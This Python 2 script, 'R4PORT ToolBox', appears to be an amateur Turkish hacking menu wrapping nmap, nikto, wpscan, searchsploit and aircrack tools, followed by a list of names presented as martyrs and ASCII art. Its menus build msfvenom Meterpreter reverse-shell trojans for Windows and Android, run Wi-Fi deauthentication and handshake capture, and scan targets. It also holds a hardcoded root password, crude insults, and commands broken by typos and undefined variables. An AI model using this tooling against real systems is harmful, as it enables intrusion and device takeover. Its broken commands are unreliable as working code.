#!usr/bin/env python
#-*- coding: utf8 -*-

import os
import time
import sys

print("""

R4POR-T ToolBox Hoşgeldiniz Gerekli Dosyalari Kuralmmi? (y/n)


""")

welcome = raw_input("Gerekli islemi komutu gir karşim (y/n) :  ")

if (welcome=="y"):
	os.system("sudo apt-get update")
	os.system("clear")
elif (welcome=="n"):
	print("Gerekli Dosyalardan kurulmaktan vazgecildi.")
elif (welcome=="Y"):
	os.system("sudo apt-get update")
	os.system("clear")
elif (welcome=="N"):
	print("Gerekli Dosyalardan kurulmaktan vazgecildi.")
elif (welcome=="yes"):
	os.system("sudo apt-get update")
	os.system("clear")
elif (welcome=="no"):
	print("Gerekli Dosyalardan kurulmaktan vazgecildi.")
elif (welcome=="YES"):
	os.system("sudo apt-get update")
	os.system("clear")
elif (welcome=="NO"):
	print("Gerekli Dosyalardan kurulmaktan vazgecildi.")
elif (welcome):
	time.sleep(1)	
	print("""

Körmüsün? Orda yazıyor ne yapıcağın.

""")
	sys.exit()
print("""

Lütfen Giriş yapmak için Kullanıcı adı ve şifre giriniz
(default: Kullanıcı adı: root şifre: R4PORT )

""")
kuladi = "root"
sifresi = "R4PORT"
isletimsistemi = os.name
posix = "xxx/Linux"
nt = "/Windows xxx"
kullanici_adi=raw_input("Kullanıcı adınızı giriniz : ")
sifre=raw_input("Sifrenizi giriniz : ")

if kullanici_adi==kuladi and sifre==sifresi and isletimsistemi=="posix":
    print("Giriş Başarılı...")
    time.sleep(2)
    print ("Kısa Bir süre bekleticez.. işletim sisteminiz.  " + posix)
    time.sleep(2)
    os.system("clear")
elif (kullanici_adi) and (sifre):
    os.system("clear")
    print("""
Hatalı Giriş Kardeşim...
Sana Bilgisayar Öğreteni sikim aq


""")
    time.sleep(1)
    sys.exit()
elif nt:
    os.system("clear")
    print("""

Gerizekalı sen önce linux indir aq Rahatlığa bak

""")
    time.sleep(1)
    sys.exit()

print ("""




 ____  _  _   ____   ___  ____ _____   _____ ___   ___  _     ____   _____  __
|  _ \| || | |  _ \ / _ \|  _ \_   _| |_   _/ _ \ / _ \| |   | __ ) / _ \ \/ /
| |_) | || |_| |_) | | | | |_) || |     | || | | | | | | |   |  _ \| | | \  / 
|  _ <|__   _|  __/| |_| |  _ < | |     | || |_| | |_| | |___| |_) | |_| /  \ 
|_| \_\  |_| |_|    \___/|_| \_\|_|     |_| \___/ \___/|_____|____/ \___/_/\_\

iletişim: https://wwww.instagram.com/onurcan.root
web site: https://www.teknoalerji.com
Coded by: R4PORT (Onur Öncel)
TR

01 - PORT TARAMA
02 - SQL Zafiyeti
03 - Site Tarama
04 - Trojan Oluşturma
05 - Güvenlik Duvarı Tespit
06 - AĞ Haritası
07 - Derleme
08 - Exploit Search
09 - Wifi
10 - Turkish Founder
11 - Şehitler
12 - İletişim


""")

secenek = raw_input("Yapmak isteğiniz komutu giriniz : ")

if (secenek=="1"):
	os.system("clear")	
	print("""

01 - Pingleme
02 - Hızlı Tarama
03 - version Tarama
04 - Tcp Tarama
05 - İşletim Sistemi Tarama
06 - Port Tarama
06 - AĞ Haritası
07 - Çıkış

""")
	tarama = raw_input("Yapmak isediğniz komutu giriniz : ")
	if (tarama=="1"):
		ip1 = raw_input("İp Adresini giriniz : ")
		print("Taranıyor...")
		os.system("ping "+ ip1)
	if (tarama=="2"):
		ip2 = raw_input("İp Adresini Giriniz : ")
		print("""

		Taranıyor...

		""")	
		os.system("nmap -sS "+ ip2)
	if (tarama=="3"):
		ip3 = raw_input("İP Adresini Giriniz : ")	
		os.system("nmap -sS -sV -O " + ip3 )   
	if (tarama=="4"):
		ip3333 = raw_input("İP Adresini Giriniz : ")
		os.system("nmap -sT  -sV -O " + ip3333)
	if (tarama=="5"):
		 ip5 = raw_input("Yapmak isteğiniz işlemi giriniz : ")
		 os.system("nmap -O " + ip5)
	if (tarama=="6"):
		ip6 = raw_input("İp Adresini girniz : ")
		port6 = raw_input("Port Giriniz : ")	
		os.system("nmap -sT -n -v -sV -p" + port6 + " " + ip6)
	elif (tarama=="7"):
		ip7 = raw_input("İP Adresi giriniz : ")	
		print("Ağ Haritası Çıkarılıyor Lütfen Bekleyiniz..")
		time.sleep(2)
		os.system("traceroute " + ip7 )
    

if (secenek=="3"):
	print("""
		01 - Nikto İle Tarana
		02 - Wordpress ile tarama
		03 - nmap ile Tarama
		04 - Dmitry Tarama
		05 - dirbuster Tarama (Web sitenin alt dizinleri)
		""")
	niktohost = raw_input("Yapmak İsteğiniz işlemi yazınız.")
	if (niktohost=="1"):
		ipgir = raw_input("İp Adresini giriniz : ")
		os.system("nikto -h "+ ipgir)
	elif (niktohost=="2"):
		print("""
01 - Tam Tarama
02 - Tema Tarama
03 - Plugin tarama
04 - users tarama
		""")
	wordpressip = raw_input("host/ip adresini giriniz : ")
	wordpress = raw_input("Yapmak isteğiniz işlemi giriniz : ")
	if (wordpress=="1"):
		os.system("clear")
		os.system("wpscan --url " + wordpressip)
	
	elif (wordpress=="2"):
		os.system("clear")
		os.system("wpscan --url " + wordpressip + " --enumerate t")

	elif (wordpress=="3"):
		os.system("clear")
		os.system("wpscan --url " + wordpressip + " --enumerate p")
	elif (wordpress=="4"):
		os.system("clear")
		os.system("wpscan --url " + wordpressip + " --enumerate u")

	elif (niktohost=="3"):
		ipgirnmapp = raw_input("domain/ip adresini giriniz : ")
		os.system("nmap -sT --script=vuln -p80 " + ipgirnmapp)
	elif (niktohost=="4"):
		dmitry = raw_input("Domain/ip adresini giriniz : ")
		os.system("dmitry -winsepfb " + dmitry)
	elif (niktohost=="5"):
		os.system("dirbuster")

if (secenek=="4"):
	print("""
	
	
	01 - windows/meterpreter/reverse_tcp
	02 - android/meterpreter/reverse_tcp
	
	""")
	trojan = raw_input("Yapmak isteğiniz komutu giriniz : ")
	ip123 = raw_input("LOCAL/DIŞ Ip Adresini Giriniz : ")
	port1233 = raw_input("port giriniz : ")
	konum = raw_input("trojanın konumunu belirtiniz (root/Deskop/) : ")	
	if (trojan=="1"):
		os.system("msfvenom -p windows/meterpreter/reverse_tcp set LHOST=" + ip123 + " LPORT=" + port1233 + " -o " + konum + "output.exe")
	
	if (trojan=="2"):
		ip1234 = raw_input("İp Adresini Giriniz : ")
		port1234 = raw_input("Port giriniz : ")
		os.system("msfvenom -p android/meterpreter/reverse_tcp set LHOST=" + ip123 + " LPORT=" + port1233 + " -o " + konum + "output.apk")
		
if (secenek=="5"):
	print("""

01 - wafW00f
02 - Nmap İle Tarama
	""")
	protectdetection = raw_input("Yapmak isteğiniz işlemi giriniz")
	if (protectdetection=="1"):
		os.system("clear")
		time.sleep(1)
		ip00 = raw_input("İp Adresini giriniz : ")
		print(" Taranıyor ")
		os.system("wafw00f " + ip00)
	if (protectdetection== "2"):
		os.system("clear")
		ipver  = raw_input("ip Adresini giriniz")
		print("Taranıyor...")
		time.sleep(1)
		os.system("nmap -P80 --script=vuln" + ipver)
if (secenek=="6"):
	ipver1 = raw_input("İp Adresini giriniz : ")
	os.system("traceroute " + ipver1 )
	print("Ağ Haritası Çıkarıldı.")
if (secenek=="7"):
	derleme = raw_input("Derlenicek dosyanın konumunu giriniz > ")
	
	print("Daha Kodlanmadı...")

if (secenek=="8"):
	os.system("clear")
	print ("Lütfen Bekleyiniz.")
	time.sleep(1)
	bilgi1istek = raw_input("Exploiti Aratınız : ")
	print("Sonuçlar.")
	time.sleep(1)
	os.system("searchxploit " + bilgi1istek)
elif (secenek =="9"):
	agkarti = raw_input("Ağ Kartını(interface) biliyormusunuz?  (y/n)")
	if (agkarti =="y"):
		print("""

		01 interface bulma
		02 Airmon-ng monitor moduna alma
		03 Airmon-ng monitor modunu kapatma
		04 Airodump-ng Dinleme Moduna Alma
		05 Airepley-ng Yetkisizlendirme saldırısı
		06 Airodump handshake alma

		""") 
	wifi = raw_input("yapmak istediginiz islemi giriniz")
	if (wifi =="1"):
			 print (" intercefe bulmaniz icin if satirinin altindaki aygita verilen ismi bulunuz")
			 os.system("ifconfig")
	elif (wifi =="2"):
			 print("n/ lütfen bekleyiniz...")
			 time.sleep(1)
			 os.system("airmon start " + interfacegir1)
	elif (wifi =="3"):
			 os.system("airmom stop " + interfacegir2+"mon")
	elif (wifi =="4"):
			 os.system("airodump " + interfacegir3 + "mon")
	elif (wifi =="5"):
			 print("""
			 
			 
			 Gerekli bilgiler
			 
			 Kablosuz ağ mac
			 İstemci mac
			 
			 
			 
			 """)
			 istemciair = raw_input("istemci(client) Mac Adresini girin : ")
			 paketsayisiair = raw_input("paket sayısını girin : ")
			 accesspointair = raw_input("AccessPoint mac adresini girin : ")
			 dinleme = raw_input("interface girin (mon) : ")
			 os.system("airepley-ng --deauth " + paketsayisiair +  " -a " + accesspointair + " -c " + istemci)
	elif (wifi =="6"):
		accesspoint = raw_input("AccessPoint Mac Adresini girin : ")
		accesspointchannel = raw_input("Channel (Kanal 'C') giriniz ")
		os.system("airodump-ng --ssid " + accesspoint + " -c " + accesspointchannel)
			 
			 	 
			 
elif (secenek =="12"):
	os.system("clear")
	print ("""

	iletisim bilgileri :

	root@teknoalerji.com
	instagram : https://www.instagram.com
	github : 

	""")

elif (secenek =="11"):
    print("Şehitler Listesi.")
    print ("Eren Bülbül")
    print ("P. Astsb. Bçvş. Ömer Halisdemir")
    print ("İlhan Varank, Erol Olçok")
    print ("Abdullah Tayyip Olçok")
    print ("Mustafa Yaman")
    print ("Sedat Kaplan")
    print ("Ümit Çoban")
    print ("Yalçın Aran")
    print ("Murat Akdemir")
    print ("Mustafa Direkli")
    print ("Ramazan Konuş")
    print ("Serhat Önder")
    print ("Yasin Yılmaz")
    print ("Muhammet Yalçın")
    print ("Recep Gündüz")
    print ("Hüseyin Kısa")
    print ("Halil İbrahim Yıldırım")
    print ("Fazıl Gürs, Metin Arslan")
    print ("Osman Yılmaz")
    print ("Mehmet Oruç")
    print ("Lokman Oktay")
    print ("Mahmut Coşkunsu")
    print ("Muhammed Ali Aksu")
    print ("Muhammed Ambar")
    print ("Mustafa Cambaz")
    print ("Mustafa Kaymakçı")
    print ("Yasin Naci Ağaroğlu")
    print ("Volkan Pilavcı")
    print("Ömer Can Açıkgöz")
    print("Mustafa Avcu")
    print("Murat Kocatürk")
    print("Mehmet Karaaslan")
    print("İbrahim Yılmaz")
    print("Muhammed Fazlı Demir")
    print("Necati Sayın")
    print("Selim Karakoç")
    print("Tolga Ecebalın")
    print("Ümit Çoban")
    print("Ümit Yolcu")
    print("Yakup Kozan")
    print("Yusuf Elitaş")
    print("Emrah Sapa")
    print("Hasan Yılmaz")
    print("Ümit Güder")
    print("Samet Cantürk")
    print("Ali İhsan Lezgi")
    print("Yasin Yılmaz")
    print("Ali Anar")
    print("Eyyüp Oğuz")
    print("Nedip Cengiz Eker")
    print("Serdar Gökbayrak")
    print("Yasin Bahadır Yüce")
    print("Bülent Yurtseven")
    print("Murat Alkan")
    print("Ahmet Oruç")
    print("Cüneyt Bursa")
    print("Mucip Arıgan")
    print("Burak Cantürk")
    print("Fahrettin Yavuz")
    print("Hakan Yorulmaz")
    print("Adil Büyükcengiz")
    print("Burhan Öner")
    print("Haki Aras")
    print("Ahmet Kara")
    print("Fatih Kalu")
    print("Askeri Çoban")
    print("Celaleddin İbiş")
    print("Emrah Sağaz")
    print("Fatih Satır")
    print("Halil Işılar")
    print("Akın Sertçelik")
    print("Ayhan Keleş")
    print("Cemal Demir")
    print("Halil Kantarcı")
    print("Cengiz Polat")
    print("İhsan Yıldız")
    print("İzzet Özkan")
    print("Mehmet Şefik")
    print("Akif Kapaklı")
    print("Çetin Can")
    print("Hakan Ünver")
    print("Hasan Kaya")
    print("İsmail Kefal")
    print("Lokman Biçinci")
    print("Mete Sertbaş")
    print("Mustafa Koçak")
    print("Yunus Emre Ezer")
    print("Salih Alışkan")
    print("Suat Aloğlu")
    print("Timur Aktemur")
    print("Ömer Takdemir")
    print("Sümer Deniz")
    print("Yusuf Çelik")
    print("Dursun Acar")
    print("Alpaslan Yazıcı")
    print("Akif Altay")
    print("Münir Murat Ertekin")
    print("Mustafa Tecimen")
    print("Önder Güzel")
    print("Cennet Yiğit")
    print("Gülşah Güler")
    print("Ufuk Baysan")
    print("Fikret Metin Öztürk")
    print("Kübra Doğanay")
    print("Muhsin Kiremitçi")
    print("Zeynep Sağır")
    print("Demet Sezen")
    print("Erol İnce")
    print("Birol Yavuz")
    print("Faruk Demir")
    print("Halil Hamuryen")
    print("Hüseyin Gora")
    print("Hurşit Uzel")
    print("Hüseyin Kalkan")
    print("Fevzi Başaran")
    print("Hakan Yorulmaz")
    print("Feramil Ferhat Kaya")
    print("Niyazi Ergüven")
    print("Mustafa Aslan")
    print("Muhammet Oğuz Kılınç")
    print("Mehmet Karacatilki")
    print("Murat Ellik") 
    print("Seher Yaşar")
    print("Mehmet Demir")
    print("Köksal Kaşaltı")
    print("Mehmet Çetin")
    print("Münir Alkan")
    print("Mehmet Şevket Uzun")
    print("Ozan Özen")
    print("Mustafa Serin")
    print("Halit Gülser")
    print("Zafer Koyuncu")
    print("Hüseyin Goral")
    print("Hüseyin Kalkan")
    print("Serhat Koç")
    print("Varol Tosun")
    print("Edip Zengin")
    print("Velit Bekdaş")
    print("Yakup Sürüc")
    print("Turgut Solak")
    print("Seyit Ahmet Çakır")
    print("Sevda Güngör")
    print("Mehmet Demir")
    print("Kemal Tosun")
    print("Hasan Gülhan")
    print("Meriç Alemdar")
    print("Mehmet Akif Sancar")
    print("unus Uğur")
    print("Fırat Bulut")
    print("Ayşe Aykaz")
    print("Barış Efe")
    print("Mehmet Ali Kılıç")
    print("Mahir Ayabak")
    print("Murat Mertel")
    print("Murat Naiboğlu")
    print("Ahmet Kocabay")
    print("Ahmet Özsoy")
    print("Mehmet Yılmaz")
    print("Onur Ensar Ayanoğlu")
    print("Onur Kılıç")
    print("Cuma Dağ")
    print("Erhan Dural")
    print("Volkan Canöz")
    print("Mehmet Kocakaya")
    print("Erkan Yiğit")
    print("Serkan Göker")
    print("Fuat Bozkurt")
    print("Oğuzhan Yaşar")
    print("Aydın Çopur")
    print("Beytullah Yeşilay")
    print("Erdem Diker")
    print("Erkan Er")
    print("Gökhan Eser")
    print("Hasan Altın")
    print("Mehmet Kocakaya")
    print("Mehmet Güder")
    print("Mehmet Ali Urel")
    print("Hasan Yılmaz")
    print("Yıldız Gürsoy")
    print("Uhud Kadir Işık")
    print("Türkmen Tekin")
    print("Suat Akıncı")
    print("Ali Alıtkan")
    print("Aytekin Kuru")
    print("Ahmet Oruç")
    print("Mehmet Oruç")
    print("Yusuf Çelik")
    print("Ömer İpek")
    print("Murat İnci")
    print("Mustafa Solak")
    print("Emin Güner")
    print("Köksal Karmil")
    print("Vahit Kaşçıoğlu")
    print("Vedat Barceğci")
    print("Mutlu Can Kılıç")
    print("Tahsin Gerekli")
    print("Şükrü Bayrakçı")
    print("Ömer Cankatar")
    print("Recep Büyük")
    print("Batuhan Ergin")
    print("Erkan Pala")
    print("Kader Sivri")
    print("Orhun Göytan")
    print("Ömer Cankatar")
    print("Samet Uslu")
    print("Battal İlgün")
    print("Şeyhmus Demir")
    print("Şirin Diril")
    print("Özgür Gençer")
    print("Vedat Büyüköztaş")
    print("P. Kur. Alb. Sait Ertürk")
    print("Topçu Astsb. Kd. Bçvş. Bülent Aydın")
    print("P. Uzm. Çvş. Halit Yaşar Mine")
    print("Rüstem Resul Perçini")
    print("Mesut Acu")
    print("Resul Kaptancı")
    print("Fatih Dalgıç")
    print("Murat Demirci")
    print("Sevgi Yeşilyurt")
    print("Şenol Sağman")
    print("Zekeriya Bitmez")
    print("Yılmaz Ercan")
    print("Jouad Merroune")
    print("Cemal Abuatuye")
    print("brahim Ateş")
    print("Muzaffer Aydoğdu")
    print("Osman Arslan")
    print("Davut Karaçam")
    print("Alper Kaymakçı")
    print("Necmi Bahadır Denizcioğlu")
    print("Mehmet Şengül")
    print("Özkan Özendi")
    print("Hakan Gülşen")
    print("Mehmet Gülşen")
    print("Osman Evsahibioğlu")
    print ("Lütfi Gülşen")
    print ("Mesut Yağan")
    print ("Gökhan Yıldırım")
    print ("Mustafa Karasakal")
    print ("Selim Cansız")
    print ("Medet İkizceli")
    print ("Tevhit Akkan")
    print ("Bülent Karalı")
    print ("Hüseyin Güntekin")

elif (secenek =="10"):
	print("""
	NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNNmmNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNmNNNNNNNNNNNmNmmNNNNmmNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNmmNNNmNNNmmmddmmmmmNNNNNNNNNNNNNNNmmNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNmNNmmmmdmdyyhhydmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNmmmmddhhyo // + sssyyymmmhyydmNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNmmdmmho /// ::: / O / + / ++ SHS + hdmNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNmmNNNNNmmmmmmh /: - ::::: /////////: shmNNNNNmmNNNNNNNNNNNNNN
NNNNNNNNNNNNmmmmmNmmysyhhddooosssossoo ++ / :: + / shmNNNNNNNNNmmNNNNNNNNNN
NNNNNNNNNNNNmmmmmNm +: -: / shdhhyysoo + / + ooosyyyooo + ohmNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNmmNNmmmy ::: ++ ohyyo + /: ---- :::: / + syhyys + / ymmmNNNNNNNNNNNNNNN
NNNNNNNNNNNmdddhhy /: + s + - + // ---.....-----: / ohdhyoooymmmdmmNNNNNNNNNNN
NNNNNNNNNNmmdhs /:/::+/-...............---::/ shhysssyhdhosdmNNNNNNNNNN
NNNNNNNNNNNmmh + /: ----..................----: + yhysoossyhoshdmNNNNNNNNN
NNNNNNNNNNNmmho /---......................---/++ ssssydyhhsyhdmNNNNNNNN
NNNNNNNNNNNmmdyo --.......................---- :: / + / oohdddhydmmNNNNNNNN
NNNNNNNNNNNmmdh + -........................-- :: + yyyysshddmdyhmmmNNNNNNN
NNNNNNNNNNNddh +: -......--. ..............--: / shddddhyhdmdoohhdmNNNNNN
NNNNNNNNNmmyss /: ----..----: / :::::: //: ------- / syddddhhhddd + / ydmmmNNNNN
NNNNNNNNNmmy // syhhhs / -: / shddhhhhhhys / ------- / shhhddddddh + ymmmmNNNNNN
NNNNNNNmmmms :: / syyyhh +: / + yddhhysssosyy / -------: + yoosoooyyoymmmmmmNNNN
NNNNNNmdmhy +: -: yy /: + s /..-/ yyyyo + / osoo +: --------- ::: / yshyoyhmmmmmmmmmm
NNNNmmmmdys +: ---: ----....- / :: - :: -----...--------: / + s / oy / ohdhdmmmmmmN
NNNNmddhys + /: --.-...-.... ----- ..........--- ::::: - ody +: o + oyyyydmmmmmN
NNNNNmdhs + //: - :: -. --- ... ---- ......----- :: // +++ / :: + s +: / + oysyhddmmmmm
NNNNNNmhys //::/+---....----/-...---/++ oooooo ++ /: / :: -: / + // ohsydddhmmmm
NNNNNNNNmmhs + :: o /: ++ oooosso + / --- :: / + oosssooo + / ::: // :: + :: / yhyhddddmmNN
NNNNNNNNNNmsoo // o + ooyhho ++ / - ::::: // ++++ ooo ++ // ++ // + s /: / + oshddmmdmmmN
NNNNNNNNNmmdhso + oo /: ---...----: // ::: / +++++++++ oyhhys /: / + o ++ ydmmmmmmmm
NNNNNNNNNNddyo ::: sys + // ++ // + oo ++ / ::: / ++ / +++ oosshhdho: / + ooooydmmmmmmmm
NNNNNNNNNNmdhhso / oyysooo +: - :: / + ///// + o + / + oosyyyhhhh /: / osysyhdmmmmmmmm
NNNNNNNNNNNNNmdy ++ ssooo ++ /: ---: / +++++ o + ooossyhhyyhh / - + shhhdmmmmmmmNN
NNNNNNNNNNNNNmyhhyy + / ::: ----: // / ++ oossosssssssssss / y: / syhhddhdmmmNmNN
NNNNNNNNNNNNNNmmmhyso /-----.-:/+ ssyhysooooooo + oo / .. yy / osyhddydmmmmmmN
NNNNNNNNNNNNNmmmmdsosyssosoo ++ ossssssoooo ++++ /: .... hmhssyhhddmmmNNNNN
NNNNNNNNNNNNNNmmmho // sddddhyssssooo +++++ ///: --....- dmmmdhhhdddmmmmmNN
NNNNNNNNNNmNNNNdsoyyhmmmmo // + oss ++ osso + / :: .. ---- .-: dNmmmmmdmmmmmNNNNN
NNNNNNNNNmmNNNNmdmmmmmmmmh / ::: / + / + ooo + :: -...---- ::: ymmmmmmmmdmmmmNNNN
NNNNNNNNNNNNNNNNmmmNmmmmmdo +: / o: ..-: / :: ....- :: -: /: ommmmNmmmmmmddmNNN
NNNNNNNNNNNNNmdmmmmmmmmmmyoo + / ++: ..- :: ----- :::: /// + / dmmmNmmmmmmmmNNNN
NNNNNNNNNNmmmmdhmNmmmmmmmhyhhyyo + :: / + / + o / ++ O ///// + yshNmmmmmNNmNNNNNNN
NNNNNNmmmdmmNNNNNNNNNmmmmhhhhyoo +: +++ oosooyhho + oyhhyhNmmmNNNNNNNNNNNN
NNNNNNNmmmmNNNNNNNNNNNmNmhyhyoo // + o / oshhooshhyshdyyhmmmmNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNmmmdyhhs +: - / öylesine // + yso + yyoyyhdydmNmmNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNdhhhhys / :: / + / ssssosdysyddddmmmmmNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNmmhhdhdddhs + ooo + ysdyyhddmdmNmmNNNmhmNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNmhhhdddddddshyhydmdmmmmmmmmNNmmmmmmmmmmNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNmdmNNmmmdhmmddmmmmmdddmmmmmmmmmNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNmNNNNmdddmmmNNNNNNmmmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNmmmmmmmNNmmmmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmmmNNmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNmmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmmNmNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNmNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN
NNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNNN


Mustafa Kemal Paşa.

""")
